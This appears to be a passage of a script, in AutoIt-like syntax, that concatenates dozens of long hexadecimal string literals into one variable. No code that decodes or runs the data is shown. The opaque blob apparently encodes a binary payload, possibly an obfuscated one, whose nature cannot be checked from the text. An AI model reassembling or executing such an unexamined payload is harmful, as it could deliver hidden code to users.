	$j = $j & "E3B5E68580B875DA7814F13FF03493D096404ABE4BB1D3438C90E509B739D3901AE6D0ED40037A442CD30F3058171584A33852AD075A702C2C8D716968E64CE2EA5BEA5E81FEF2A1DA61EDC20A9E3A09D1F7B70526DE953CF424BBF43D9D4C4C3AD09BD32F027A9C4A9C1F9880B67027D6F312E92A10D9540D3E656FED749C65684B955EA7E03C40A44507E5CFC635C41AE67EBDED40"
	$j = $j & "FE2380DC9DFE30D172D3F6D028318FA1381BA63A858561C4D918C941BDC69889C5D99933DC021FCC96BBEBCC8F14418FF048A6B6E3A4CFACC9307D65447C19F4DA80A641FE1EFAC6B0D263D9F1192CF53A382772887673C1A3AC017AE1C4124AD7D4CE282495219D3BE31658058622A4C41CB90E1825349EE9E1C68B9DC1508E670D409361FB020089390B4C8F618573E11FB44EA85E"
	$j = $j & "04FB4A8717B0D59677E8A7BCB180AB37FEE5036B660CF463C80040720C4F319086B87B0E5CDA833CC696F62EDC400B721BCC3EEB5CD6E4CAE608FD2FBD684F12C88B530478B56BD9DD1137B763AD9E2A13FC3EC802914DE66D807C20A7A982EB3C750A43A386C72425E829C45AFE6A62FCC0F71BF3368DDD2EA92374C6793F777FFBB40E6408B7A2ABD2FDFAF38F489EAF1EA23F969A"
	$j = $j & "226815FFBFC14BFAE45BAFD50FE2C4BBD0FCD6A765CFB9FC4A471E2A5FB72D9C22823F64B338EFE69CBB55464308551835D524D2B03E6E1FD45DD13C707C0EF3AFF707EE9BD67B006018630D79678CDD93D1FC13A4DF333C63092B362E13EE2D8CFDE2E5BB2A0F78A3E4AEE4E91D916794D1A92B968F34A764FA163EDEEECA8B2B0703758E4D542C39E485B048CB085987D39212DD55"
	$j = $j & "7FED9F13BB6FDE963C1E68FCBAA40BEB84A04CC2CA59FBF911D13F08F5B1E3D34901D502A3B24B120C7088584519B046B64D5BC6737109B7D3D3BCFF4308C6D6ECEEF9A57AAF0361950B718E476B0C2A4F7A97A485BDAF366F09BB3A489C0E7B5CC663AC4FB2AFFC01F29691B6D724DC6E09C001D016E4342E9009F1AD245694742A3F59986B16EDB774ED1A5BAAA522D14850D37FC0"
	$j = $j & "472C4635EAD54AA62995F6B9BE5F31F71CDE4FEEABA3FD7DCC8A854ABFCC305AE86F9492594DF5F84F201396D5BA5722491AE62913247DF9245CE10B4AA96C587B0424D9F6F54FEF3C371247425415E2F7D2929F5939B2A16FE3BF2EBC6F1749D19B80D88DCD2F69A6A6FF56C8CAF00D84EC405FDD3C5C0F0A6B8100986D1B50A2D6B79A27324598E8CA5CFA9508C328C6E0D75C4585"
	$j = $j & "E2FF6596BCFEBAC9C9D47FA565748FADA51DF2B8F62CF7A72B0BD92B331D179AAF8962E66BA4F09EDFE2EBCB5CECBE418FC7534079427488B31C84FF7A04B3E756F255C52735349B2EA2FD508A13EAF268F0157211541208EEDDBF860942C98E066E4F7B63F47250F8CFC5ECF8298F02ACDA39AF0C0D1DEA03C5718B3E9655BB8FD3887D976D5EF7887193A6E2C31D124275AC4BDD29"
	$j = $j & "AD76F98B10C97E65B67F402E89171C9ED15FD6AB3670D8295876C310CCEB9609C6CD41BA72171D44A1EC1E3951B1DA009A531115FAA4777E3E1C3288FDDC8598DE0B7E9F99B496B2577290378F13EE4B051D70C1DB09D67D65BF949683D7E06F9150EE5475983C83ED4190D80E04CDC2FACE998D212845F6B1DC58190A0DC5EE24A88C4450B3E636D99254B4338AC8D1D66A70558855"
	$j = $j & "16BB33213B0C43BA9531286546055B10013C8BDCD20BEB0EDEE4AFFB1BDA1EEC024D0E8AAEF7DC84F6FF58203659A90792C6ECDEF9C734634D556EF47C5A39C09533960EE038EB5BCF6C2575917A0AF07B37D2F744A1B0E9C6388E211474DD95893AD7FB35ACBAB0914A895ECAF5A06F4E52BF79D48FBE134F5911F311D29CC8B4FEF0D4948483E4EC0A73A4AB317D526D8E70353B2C"
	$j = $j & "07F1B90F3D57C69FD964C2CBF745DCB8EF80A4C8F98BF524B34EEB226ABE43B33B0BE9D91EE6A2880289FFA1DA6762026F58E5837CD7BCEF7676E75A0F8C93A20F96AA0D92649C95A19409A88130C03ECD657538289B8FDD540665895E3FEC81AFF006D1378AFC2EF3B7771DA9304D67602A9688F07C90E72CC57C6FE6ED73277DBEAF8C61952CC6CCD99B5E2C52CE14CB1480176F89"
	$j = $j & "36149D6315E175055BB471F09A20032D33C5F9FF8A4CF8868F99B5EB2F907538E3BB4E995BF38C2871B08422F4ABE954A1154425C14A4A243EFA1E7CAC52F2578582670C57244CAD29A97CAD06FE2F449544D5476C2BCEA0F98DB4E9564D10256FE72AE8194C116CBD89169ED1C784B0C3C96CFD2FD2FD81E1164BC279C856F6A4DE98AE134701BA40AD3167F09F386B08928562BC40"
	$j = $j & "52EF9C5D90D40D53B243B62CB8808C566A4048924AFCA7B150E87C903995A325A0A3AC78EEC7EB619DB268F729B902AD74ECC7742B157E68D4DE8E69F833FB409B40398AA782EF788BA8E2F76ECB34248DD968A0AEA3C068F0A7FEB74CA5B2F6D532C7B707E3662A72ECB5A363FA2BEF939D5B0BB55B1211A1974C831197A3858F7D9DED518D98A044DF8A341A0992B553F7772D8509"
	$j = $j & "374A1AF6D50C0C13371FF609572A787C92AE87227A96B9CB2CC64E83A0BD170EA01FBE261A84EC6FBC6151D9D96076292F69E6F973D891F0EC130D4B8BA3F7A1A42DAEAF12CD53F8674543D52DED123AD1E9F36FDD9C4A17F1E8FDCF8DB80CD341D0F43F78D6E7E218B94194DB7667DC8B9B77B8B6ABA859F937AD749C4C3F0BCD383F3DB1E3D2C83E5F907A8DDE6BE3437B1CF2A0D3"
	$j = $j & "CE41B31CF939538B72DDC2D4DA7BD465ABBC1308C033D93D4C6CAB7A166C5FE4985556C278C16A95F85B28FBAC294D28E83167D3383FC0E066720C5E4240027BB3026CC9B1757ACE988FF28130693BD4C925F6885BD5C3E8C64C7FFC4A41AC37912B99BA1CD2EF3AA16D128DE5C149F4F2A2418F378BF637C33C32974BE2A247BB7143AF8B78F323A39C8940CE5A06B75EFA7FEB6F03"
	$j = $j & "0729614FDC3EC86F38A662018F1B40903C77DA0EB15A60E3FD9AB688D982EC4E7097E108027D87BF68B05074FFED8EC7D5169E5429A32875F2F5EF9A15556B26797C47C0E4118043FF4BE0547FC31F0855420CB1A013275974998017C4624FD7714702C434B2DA50FEC613AE6A8B48D4B5AD5FD96E925186A167B2D78A94BA6FAD6E75F30F25A1CC5DB73F1E9EDC4869BBFBE8E41323"
	$j = $j & "2A4989944D644D7EAE9C177589010D934489AE20460D356857A39EFD05C7188DC617DA40080230BE08E0EB03975C84AB4ECF3D028DC5929C4DEA53D1D8CEE962063C95389EF73A9AB4C1C5151C75B62EB847D329CB2F0912DD3456544A9A2D32CD9588795A7FD43DC236F954F701C14A32E985A0C5004BC7A94F8E3BB966F57DCC52B6151CC8F6F07A8CF686803615F077BE27521911"
	$j = $j & "8841D234BD511E4AE178BF1F077D8890D29E2A92088974ECFAF209AE69138CA8737C37BC65A05CB78316775D33E8803275D7724023FFD8B2EF0985348B6D07B77EA0E8FB9633288A08717877345CBD461F4463CF60F6035235E7DB3F83DB8EC501268957D77452A92F0236A3798D4518E049E8D6BBF037993B5B4FADC868F2061DAE902DEBA9C2E9EB6183CC9BFEFCA9D6687A157D1B"
	$j = $j & "A9F7FF70C702A84730536A754E1F8E807C3715889BC2C42C31B113EEA4E26CB7D7DBD2F46555C241B5668015552D76FB3A54DD64621B98144AF0C9BEF3848C9CDEA7EC595E33DB2C4A14E50D97E5E9161BCC3A74DC3536D9ECB98206105746504FBD407B681B06EBD8DAABA7B14BC58CD223E3611778CCF4D6AF9506B33A00DAC9604371C33054CC30421612EF66C8DF8001C4C1DBF8"
	$j = $j & "08A39DEE436AC01020BF824587615A1CD7978D7555BE215FA89B6E569352602A0C251B05630E13474F0220C9F1FA1F1673893376A24CB4F7CECB49C4DA4756855D3140610D5EFE127481212764CD080C2FE279F51555D05FC4F617BBF0A229092BA0AC7C666EF6C57131625257F3CA29E225AD37908B898655764C432496C029D1977962FE50037EF87A06112F7BF3771ABA6B61A40F"
	$j = $j & "BE49F14D9CDB677C889B532ABFF4FC07B2254E859E55FC35DD8540D8D7D5D92827EA5A3310AE9033F2C04D02082258744DBC7A046B91D1FFFEE0B34A487443FF023D021DCC4654A08025536853623544D99CBF2FE4D930F39B9560DE68289E6E60AA1A438C67B1A8998A1F95DD5BF6462711E2B3B3C37EF68C76EA23FCB0F5C1D357DC254B7EC8F4C0EF0A5AFE1603B43FF8E05B59D7"
	$j = $j & "AD1146A74DC83C452134BF3DDF971A54C1E1B42383477CD60A37AFF52D2EF19015A48D5540246353BCF00FC1125ACA5BA4E31D291438D09E898ADE25A05907E2C1ABC77FFFA3E120F2C6112ECF8D582AC0D253D6EE03F30714558E388E8A2ECD9BEFAD1E69754CB91257DD27F0D6705B2E66EE93ABA919923EA61C4A4E405D0C289A8FF0D4F6DB708F17E70ED3340A996A72AF4ACC97"
	$j = $j & "C6FBAF158F8DC745611FCA3DD169236A2010935EF3408417EC3773C73C068C3E976C072AE9226AD54B58643318E62C712C1630B9D27CD2765065109303C7A3FA3CBA1E77F258EFC2F18186439A21FBDFD7DB102698CCBBA932A2D787C1AAE212439BEAD5E460C22F8EA3780626F69FA1992529A6A4F47E9B775E75E5CB5F68AEFF029466ABBB4315418F6DC6B2EB915F206EC7CAA83E"
	$j = $j & "C5873F878267C299DF6B528F5AD04803EA9DB259FA43F6E818FCE07C47397E6CF1D67ACEB3027A44BB354A6897E778F6925FBBEC2A60F3B64776C6744F56E4F6DE71139929C1712FF0246B4ACB6963D4DCDFD438C3BEFC3A40A67F2F56C6EF6AE8E5906FEC2E84B59FA028D855346BFE850D60243A2ACCF7DAA907B46BC8367E492CA968A7434F74DC1551A858ED506A9C69D505ABAB"
	$j = $j & "982E7914E5967FABD28BC54DFD29E434F3F4D3751EBE1B5027A5950C818E97042061A29C38A7F791E45595214C681FD402F955808AC623703EBF043369DCF24DF4D4516F8358EB09F56F587DAD3206DAC8E63B9A7CF566EEC7F799692FB353C859F7B121547EA69AEC89D4EB6B08F7056151C6FE6D8EA37F9927D769E3613130D73340D2680D453563159F5AC19F5E4230E37B48770C"
	$j = $j & "47CDF291029ACF7E45F3540DE1480B11AB172D9620D1BD067F36E79D39C2F22C4AD4527D895D33EDDB5657C76E87351F9187F49517BC9BF6F5D4F0EA248E860B665CDC26E83445474C8AA2097BB338272160D09CD7FBC1785DEF923A086A483EB80FE9EC68BC4CF8049FBD2D5DF4FD4E42041D88C12DBB18804F3AFBFC345FB9D407F21A6ADDA977632C5CB77FDB10ADBCB8FA0B15F5"
	$j = $j & "C621391C2E85A3400B9299717EEEBBC6FB3FF2154F7D021914CD254E8E56D5C9D94565836160BF81B3FA6CAF229A7AFAD4AB3D0CDD34902E259AB95948F2E35AA368C84812871C8B01ACD5F1F6F64088BBC1FC954F62313FB8EE7396412828712134CEA80D57477203C858C327C8FF3E4E76F4DD52367AA305E298513A503F82C25F041881F2984CEEE4CC235DA0E8D7B9C306E463E5"
	$j = $j & "B47AA282A381FA1263272FF16F129294C5212688359BE379B4C6AAD85CBA5536139BFFF8426D6C310002FA72EEBDF38FE5DB5214E484E9799FFD31ED46021B1989CF6C555469E83CD678DEAE1D0352CB078064027A2FD26EBD1EAF99E757ADBF6591075EBD6774BE502044E78FE90A738D7398F6D85F65516F2D5BA9D8F01685DCB08186974DD4FA9FE7AA8B65D7187CBE164BE40987"
	$j = $j & "78602C2ABC7FA8D52B64EFF6766FA25CE25CA2D6E847EAE3856ED35F84B39A506B77D83DE77B61E62F28496FECC800011980AE568FC9C6C6564ACF595B0370403623F35D5BA1207CDC3F09CD35B595BDB650EFF200ABF2DBE0F57AE09786AE08E2377BE8707181A8397BB498DBBFA9833824464435FD623A588719D49259473D436E90EADA968FF6E5A1FE23E7D5AD1338AB532C614D"
	$j = $j & "BA030DA3DDB2ABBDB4D00F03244C810EDA9DB4DB70689163CF6467FA81995079DEAC7C22C89FBCF079EBB2634C7FF415D5541B092998FB08643F1621A7E2CB13C459C1720024D52F9FE14DD646A7CB76DEFDB013A4A064F5E57CAA000F2140F030047A0AA733D8CC61E678A8B122587133E202210336E4A0C0CE994B9CA8BEB3B279C5198A996364095A3BDC3F00D87586452588AFC0"
	$j = $j & "7F177CE37438F8338C36D564E586A0CBF98D4510B4107D39E17A615FB889A0BA551872F36A565EB13614FEDFA22739867B69E6011F684CE3E716F854A0D9AD25771E32CD4568489D42D36DAD5D1F2636B665F17954020369DADE48B21308CD14028F808A3DFB5FD3E907C4D18E2BFB8392B0DEE11422422D2DEC15BBB9A740CAD8989EA001122DE0773FF5148D2D548648F59C3137E1"
	$j = $j & "14E9AFEB789F9241F6AE1968EB2EA8CA9C25776728BC91FDBE0EA6DA6A23E6CBD57B205E4D2D5E37F2A1106A3D5A1DFD0627C16CD461461603CDBF05BE19AB1B1C1D66EBE88F11FEB7B6C3EA4BCFBF0FA82026F4F2868CEAF99947E6C80676F4B2153B9F91BAEF5A24A26453A610B5F046D08D9F392B92C018033BA4414608A585F0FA947ADDDC6637F5754A375141BAC02331497EF3"
	$j = $j & "6249221EF333E8414143324FA502D0AA02EB7C103DE732AC95D0B1F77648E99BC5BA4BC5F76A6040312C3A280524119838FECF7FB64D02B33DAA760CD85C13868CC5CEE3C985701CD9C35676A110BF8EBD72C83C98D2ACDB9C87A7906E121132BE9F92619121F72534C6BDF649223A71D4E99E8B9FDB2B17F643AF531E59C67BF497DEA78F7658C339C153796790AA22D7A9C0243786"
	$j = $j & "8D91238BFEB9178CF1915FC13A03BABD4C755727C7445E493DD3215219A30083DD5DBC5A2D4140C1EB1C413E02A33DFCCDBFAAFDBC1F6B80A25F02C3151DAB8F850892989553268682DAAD1E63F90D54B11A395646025A2FC976628F56C68AD49668786781CBCA1DB1E049CE7C53218F0DB3CC3474FCE76ADCE50141A34DC21BE4F2034E5FD2BA8264B2E905B7EB4E6E99A8C6B82665"
	$j = $j & "167EAC76B21E5517747DDF0E3696ABC2509709A33A56023FCC4A86B407C9257B5185E8C3BB86608D85E481C10AEEC97DCFA0EA22BA0F85050B4CEB3D526C5499D8C0FBFFCE559FC964B234670316CE83B66A63F97EA61B8ED77436565077D732C0AA8E132335D6ED0EE717A77E5D1B19234E52E3B472BABDDC16E1393B03CF1292358ECD16F79D4EDD5D2C3907D0873DCA5A013069DF"
	$j = $j & "E3857ABA400E36060A312A435B163C49B5F0FDF99C61D32012FE7B54C478C96931379D78E02F85071C811FFF29D708398236470B0A6562A9E1D27CDFD1BF890204D8F048344A5BA9036623F2F5FA394925E9C7A94066ECFCC742ADEFF91A2EBF59A43FA7667F6A6C694138A38AA844DA54629FEF07A51B79CA92CB20EF58846E6670033FB84D46C780DE9C32ECBF1C80370546558302"
	$j = $j & "F4DDAC837696B62B2FD189C424616BE933F570BDCF9CE54B17CA01063452EE087278B7B77E68F0BB8A469E410D045BED850754272157099A9518D18DF94B52F5695A82BE7EF6C53791F2047081D0DBA8E05F56942DE4EF7D6443F8DB918DC2D76401113A1057906AEB1FB275242CD1714521362B957F438435A4FA41769DB0FC8409F5F5EAA66AAA2BE5486659F1C045E5375390A64A"
	$j = $j & "A9EBD2F7B3A9DABF8AACF3D61E415FF0FDE7BA57B558138D3697147BD98F6B355DC534739C53E9D70AB62FF910F5B620DC90D733945F410F65C8287E8C03DAD98BE06BEDBABAE6E75291A566704C179DEEF2CA093DDCA538DD8B2FF87792F73DCB0EDFA55404146AF775B8DAA8A03BDE9FE698ED68920034A7868382C34A9EA823D357876E25E7AD8EFC1B311539E820189E5BCC608E"
	$j = $j & "D63363FE551307DD51846B00A36E6412FD2791888D7E5C938AD0EC51C67FA576B85C6BAD38C6F5672208114E1E011C53A6D67FFB79B9A7B40BD8C81514A3143CFF203E72305246D05B9AB9DFB58413EBD7B180263BF829C82B4909A8571CB20321CFBEBD09D8C64222CECE121AC7D9E84A4847341841393AB7C334A97A22AD7B5C1429975DDB69FA4C437758816008586B2A14FA3BBD"
	$j = $j & "087653F1202F6CFA92C752517D97F2AD65D7821F21E31593FE61A0CAEF6F4726FAF002EDDC823A61BC58AB801FD36DEA5CD57F6342EC7317B74AF00AA0FB4477647B599EF4A26668A73F392E6310E900639D8CFBC5D78BF9327530C81D7D18016F2C0B0F35ECBE002AAF2F80C614D6352A75E2EC38C4D69892C4D2C65893C930DCC952F8164A8F457F957ACF586B11DF6079CF627358"
	$j = $j & "98C4ABA9FEBDB5E42A19CE8F7E21AD596EEB25A036D2424EB7B117C93F931FF2897A65BAB2F8F73B861A38FDF22700F8395C612C78E62A83DC3B70AC4E445F37541A1448ACA11B1386DD87D5245FA4039E364C94528909AB5ED7E3CAF8529E30362CBB8E11A0AF7A622F38F2633C5AFF742BF877834513BCCE6A398E8A17C450026FA6216D62C1C5B6B0163DBA634B009A62BF9B4239"
	$j = $j & "03A285F103984AE7E6CD89702B6CFCC8CC8B12EDF71E7DE0CD514CC83B2F7A8878548F9F068CE5E8647A8294C68B2157183F232F248BC9BCB5146A196FE82CAB1AA5A73714D2AEE43A3005A71756BE50BD23A8F668F3A6F848128F845698E56D43DD55A9401DEA70C1322A259B9AB4A6BC94BCFCD2DDFC2A3C99E9F617652925E653E8279C71308632666BDA35B695B67D0A5637A70E"
	$j = $j & "EFC992F373B6D789CF7EABA960FB840F4782D5E63F1DA3B27F41EFE0B1F7DC71FFA5899CBBAF6F1361BCDF31A9CAC4EBA188A6F09E180F25E77F1BB7E0AA376DB89BE24C20F1908ABF2A0AE754BB864F2EADDB23011F758002136DCDEF840D01C4916E47489F778BC9E6923BFF03CAC2EB8C002F5BB2212320FCC173AC1107FBD01B3F935D58BB98C8D4D69877E825F0E3FD175094CD"
	$j = $j & "82C946E841981E6E72044D0EB2AF7908B2C3CE7D2330320DE808189EA46615D851C1CFD2C8035A6A40CAD3E066005E75EAE4A7A285CB06E02DF6333C56BCBC157249E6D139655B0E8A1B6E21C4E869F8B2EDEE1980B0405BE58B898E829FF12CA5CF2B94C14C8346442FB0AA43425ACDE855FF8A20E7B3675872BE00FC3515C66DF5BCDD0E0B2671B16DD8D002A6FDB1FF384895F0FB"
	$j = $j & "46AB39855F1800B9D7F3E056926F3F75FA3523F9D27AAF5B3FDB8434E0A2CE9F50BA0D712A9239F6D53C7BFE8A72024CFE22B93E6F8FFC94B2F9BB7D19DFB62193642BA6EF232BFD9D45603DFB9D2D3870A935B55437E1EB5227733B9261666BC41DBBB545CE06E5C449B6EF73D54DF9CE7C84424BD5B3399AA736903AB69EC219195C5D6D431B7B7900EDBA5EBDAA37135CF4E7FDFD"
	$j = $j & "4E4D482AEDCBB54393C4276A1AB1E80BD102EDB6AF8C120A41252F240F2BBEE77DCE0450C36779CB0CB11B0A1FACEC46C72FF05C7930C9010F89174B269A0D9BBE11F292984A0140A22098486782A718705A781D63C6DE9BFA8DCC66C99F250F2C94D5BF481AF3F40D8796CF4899062C49D0E3D77BC05646FA1389EDD8DD00DD71F4C5427393D0F1225AE8FF66B967792AFBD7E7DA4B"
	$j = $j & "0BDD276B0B2E90CEA33D6668CB3F829F6CF39029CF05F5C1F7B2FE839B62163721786CA13EF297A94A68BB0BE95929B85BD40C04787943BAB7F8C2AA3D6B1E46C5115D4ACA0EE536A093ADE2DB38F5038EBC314AB7A7BAADB430B002F161F05933982B3F9DA2C325814414052C3BEA7742F81F154EC1B4004045F0ED856D8DAE0E377586A91199B7CAED5864DEE59000147A8E8C96F2"
	$j = $j & "9512B9B5CA54E565F3FC8C9FD1BF9D4364D49D4130C524DDF75D66E1FCA5E9C0BFCBBDCD8D47542485736E41B0E4871464DDF3BA03824A6AFB75D86B006330501D395C37A17DBDC8EE9B11C1B71D22920CE0E52F9345FFAE53322DD96A611C4F98359979E1AD0F173440082C4766C71B9CDA8A5516495A466EA36E838F633B5800D23AF53F001F4F1E08F9A6B2906B957A1FE9296EDA"
	$j = $j & "9F4BD41F97CABA7C6DC34D8B4B307B948E2FABF0446D436F3C8C621087811E28BB34D44C2016408EFBA644FFDFB105787A4B0515E471B3978C43CA80944B890D2FE53542972950C7325EC1B81EB9C5D33C00EE968F3AB99532A63915AE5E8BD081C1125FE2FD8B8A66F9E548C0046F376054480706C7602374C03E37574FE3AB9E6F0C588889A9B6377DCDEDFF1BB075C10177AFBDCF"
	$j = $j & "C9BB2A0157130BD49BC97D9AE3C337334F158844F95315E79760241B65DCC3C7D2A217352ABC3A878568BB9743E8F9E6EBCD2A481CF8DCCFA0430511F13D9F3816EA83B128F499CB95C7E706B34E0004B6313B70FD0473552FDB4FF77CB9719986B3F9129F569F237E246B42DEC2AFF7960293E939BC4E869C746E83B005FFC05A3B6BE44753C5C9C442064B2A0A56CB4CE7132146D5"
	$j = $j & "5226AC336F064F8296397A5BA30151CBCA93E91D48AA76732030A682DF4A9767F246E52910AE63B99283F942914FA0629FB5BDB4AE7233ECE999E67AC02C75595C73F6B713B363D55D4F4E16A705885CAA64E3E155E15C6E6A86DF5F8B0B459541127171ED89499D5C78FA7E650E39B0A20EEFCC6D5E659DA41BEE251226AE59BB3393FAA97C20CC56F18E8DA8502B9B74B953BE5C76"
	$j = $j & "C94AE5988E2DF83C14A55C587EB9C1C8D19530E19F0B228BF2106308CC59CF56F74D01207D157714AF1E985882C7DE6AC7AE645E6BC5D821033CFC5ACC6AE36BFD002AD80CB24A4EE69B4B3190A9CE606C3D23C5766F65D57AAEE57457F8BDFEE607B5D601E196232F39766DD0A5D00BDF0464062287F8427A2B82C014B6FE63F7DA3C600C508068A554D0F945CEECB150C94AE59928"
	$j = $j & "A24DC2C278F17AC0904EB726FE1BAC89CBBC7EC0E4934D3EB1D4354C0A75B4513A61A07BF40A61A66C387D38550936A8F01296DE40DCB563D5E85CF295FEAFE3C6D67B5F43F574EE2C381375A10660DD25FA5607EA87C310A61B0F213BCED1F5432BE31A0890D7C5E6F75073D423BB180054B81D39724D37F8F441DDB4E8622472487158F71B782DA500730FE9D299E1C035E13B3BA0"
	$j = $j & "25C5DCEB810183750FB714EC244B23514F0A9D41C0BD1E7A42A2EE0F559B8E19CA93D3F241E0ED9C4D19C4395F56EBE59B4919F94A0604C6CD981916A982EE7AFDA9C13CB7F93A22532CEB9D243348696AC3FECB67E3B2B6C23542EADEA9D0C96D8E1418F1ADA60E85B69C16449C12899FEE3979CD0CBFEFBA6B93CF9DE1B1FCC6492485231D8EAF53AE3EAA1C26B5E5CEC9F3687296"
	$j = $j & "A3B80FD0A396F4CD6CECE083B775DA483C72E47BB2A38B6F1E5E204408F682760F94EBCFA851AEF6A8CFBFCA83DE4257C0B822C7CC0C5C597E54BB2CED4715872AA078949A167346A48D9FEAE0179138867B24F74D393234566036A8E328349592C81B102F19A7B3DC1B76F0D4D7993C5E06C6873A3C13B5EFE35DB6630707D2D007907E433E5936F12A63A41574C163797D4A94EEA6"
	$j = $j & "8DAD545F37643F3BF194F4B1571321E6678FA72B5273BC6E5C7F7E64E1DC4BEDD0AF72D3FEA30475D599AD05675B8EA4B3E611D7A29BEA587E1DA193B93CE2DB2885040B9D830E46FBAE822709F08A6C328D387EEABD02C52DBDDADACF378BC1F590F2C6A5D612BEB6C1A74EAF43C3D76D2C9FBDE1232359D17CADA3D90C1A31412DDBEAC96E2CAB4BCD2380004C17421434338D1834"
	$j = $j & "B4DBEC1CF1BEEBB39422DC1028A4C13BEAEBB5DF82E3831168F55C8264CC132339A2C17EDC48DA4FCCAB07424509F640D0A3A8DFF08B6575A6F28C05F958824ACF561E7377B7C7D510A74CCBCC2A01C370B74AF9FEAD2AD5D920015ABEF55BA2247843E8A986BBFC999BCE1E01E8E15F211BB6EF0DBF12C2183EF3A4986F1AE180C94ACF10F574C006F002137C77F3D18C3B668D280D"
	$j = $j & "92141B58A96E7F7923B170A7964D83CBC0C336F75A5382E3A84E7FF9847BC852F1CE7F364451FE37B1C7416BF85FE37D5A55578E76B984D4F323831FC6EE865B33A015C1B9CC967BB508F36FDCAD5EA30F870ED41FE3D60ADDE51F79ABC6A2EA4C9C639E70E4B9D7AA08D98A9D232F92D0461C9EC0D39AE3DFF235F3D70731EA9CD6FC84DDFE6B35D52DF575CDFC552AE772D040BA14"
	$j = $j & "438701FB3D55D20B47E4BA2C76E48C792F7FBA63F7F5BDC21DFB91AF724894BE983898E12BDCB8F1383160A81B9482AD44D5E7F5ADA2B9556497C97034A7EBCB5C00391A98A8A681A1E57CC70FE663002B11CE8F1CCBA7FE199876D894B1E218B9C2E7BA22561F8C780D923ECBBDF86F5716F6B017BA9863E79B171FD964363DFC9D49F5220DEA5EE2A143690CD2D962CB55169010AD"
	$j = $j & "DA660D26F3496E0A7E74421738F77E3A9EB9FEC31255AF3113144898E5873583578EE178CFA014592677754A4FFEFB3136ABA84C72608ABD5C88CCFFC8983C8AFC083631EE8012829C20A9F28587F9AD3241C470814C5F82688CB891ECE371344F0503ECC44DC9DFCC6B8007287798DDBBF52E81A60D3EA4C7DB927B455185E74DC501B23503D477FD330683AFC051961B924ACD84B0"
	$j = $j & "700717C977B6FB01BD40B2A2EBA39988D9CADF8654CB70E5C9925ABD2DD32025328F48F78AE586FC9831A3CEB50BC22F72EBCE5E65F4BF070A56002C52337C42D048CBA1331844376685304DDBF33CB9B939B7982DCDFA4390A04101A7DDA9E60477EA48091942D6E052412E7F734162EA1C5346086DF829672E4B1A1E6B784532B13D2FA54FE8E7B3AA3E92645CD8166E84926D8263"
	$j = $j & "CBD41D8DF2E22178E7470F0837566D98F7E3FDF4624253D0C7F4EF7355AFC4CA33820309BAA4D4C66C13F7A7CD0E5868E79AF2BDC6F887D38EF5CE8D24DB92C02A54EB3A8A0473F7003B22B4A8AF1CF5A7F4B154B28967EFB410CD4F5D3A2DE37A8A06C036165CFC3CAE2FAFA7505447CC6D7B9BDB0E9116FAC91DB8DC775FBCD0D856263D82D86BB990D36D0529B1C402A4B85C7675"
	$j = $j & "E9E0891C2CF6DAF61D29F320D01C5D88176A457978EDEF6F600657DB863BF26333A109D755A34C6C3AA8192733BF8D85D0B0BBF8C8E64A201DE58888D561EA145E4840448CC047B04C395B8FDC7EF52C0AE1AAF36202C50C4F55E28CB8363099345A7AEF34370443F9273EA6F509E5CBAABC9E419C653EE2D5A81B89D1B07C7899284118820A33905044F4573B43E4F942DF8019921A"
	$j = $j & "DD5A2F72B5FBD7E94A81F044E82DA6846D3DEE1DD6A3498FE5A6169604C83E84F0912E0AC51E72F923B615F65E99D511AAD958A14B93760B4F37786512261F0E9BEC21D9474FF83070B104F323716A42E2AEC07642311245015958FABD1F5DEDA29A1D6562B1D2BE998977D897C352A590A2F6CE9CF312D7DA8C5A0CC9230D7FA374E5E9E91691DB949E0A7E64BD9219430AF886ACF0"
	$j = $j & "8E0F7597DFDD90C3E62157E372554D8357A2D9DC07027F7EA03469F5B81AE4E14B3D681722F2C229440C9F59FA0FB3FC3F12B5146B46283ADC5182347D68DAED9F1EF3C370ECA045B89893FA920AE7B8ED919552692B0F01F41B9F77CD636754BC57B01FC09EC35500CD817625E3126CCADF262E4769147567623DFD53417BC93D88A882FD99F788F8D0753D9AD7698CA08FA3E85C98"
	$j = $j & "A6E2A1EAF3996F70AEB68EEB706E93B195C2D29D1F2E18E8BAC5749D9508DC7E6B8680849BF49FE503400E08FE3660974595F5FB903BCDB1E50F2B7FF813F158702D41D819699A747B77B2AF796BBBED28E021929E1527012ACD41C30053ABE8CD2F4AD91571B9B79DA6611383EE6A157F3A543DEE6F6DC7C087B80619A9AC66BD963CC7D12C462466FDA85E7675B154AC5E03723DCB"
	$j = $j & "6C2F0685FD21D83D01685152D14368BA65FD19303EFFAABA192BBB3BB54B38E553A62DDC00D4E8A97D63C87A5C8D2F586924D75F8EF803BEF14D398EC3BB315A046B14D94CAE4FC50984B251CC23730D6137E3919596C143CBF703F097F2B17C98D4ABB38A832AD791BE8F220E486FDE6FE36E4577326E5220EB1B42FB053F3984AF887BA0F074A5B6FC577D9E046E52D49F82A9ADC3"
	$j = $j & "07FE4C14D7BF5B2F046C9CA7204FA2293A2A15CEF13C5D27E1F87C028852E0EC86DFAF5AF9E7D60745C6DC5AE18B5D178DAAB60123CAE8A8B5618FD209D8B5219FF70A9967DBA31B9693059BC63308FFE95E3354098F712CB6A13966D3ECFF74F1FD9E4B0B94EAE33724653A0DFF56BF84FC5848618AAA28A26D41157254F9498FCB770BF6AD7047EE5B63633D37F07284FC637942C5"
	$j = $j & "52CC60460FEC555BB6789C89617291AD458267EF0FF1E2B973821BD2974283EF2BAC9484CD0111AC4ECD18A0E1A9A30DC4CEED6C640078AA17CF0D360E551C57CBF7DED80B29BC6C773076B7B3DF71A44C44F0DEC328C330B0E8D8221254DBB77AB1D03373D642CF1A3A6E76DECC55828FA7F6EA67A183FF5D74DA96BC94818D6E20F8B6F465927F782C7BC8CB81A4EBDD48CDEE8BB9"
	$j = $j & "49BA79E54F7E4272885950DF870C6DB30DCC597C71D3AF48FACED7D62A06AD15BE284AB79BD9B6EA3E85678E63CB6C6AFA9C4918B18042AD5F7F91EEC7835770486982434954AB7BFAC642726E4734335AB09DD242BF1CDB154B072FF6553F5BA9AB3A9F1F8114BFD474237D0A2353A88D0D96F10F7E6A3F310599C322103BEFD87B7E475B0FA4CA11D5F0AE66C11DD2805D6A90EC3D"
	$j = $j & "4BAAAFA813679A9A888A0779B9D3C349E44CC8DEBC922E3787ED81B2BB89F67744D6FC606614C6B41F19B2E1FD87185D370BA785442C618EB74E990ABB0A444BC939578C213438D59492ABE06BCD4F76308EFC2252D65118C62D80D4525479AF6E51C5FABB300ADC4782F16449351719F0C57221BB4D7E825D3690D9A1D288C653C95EB8AD08A363D86C3F00AC02688D0E9D3EA27D94"
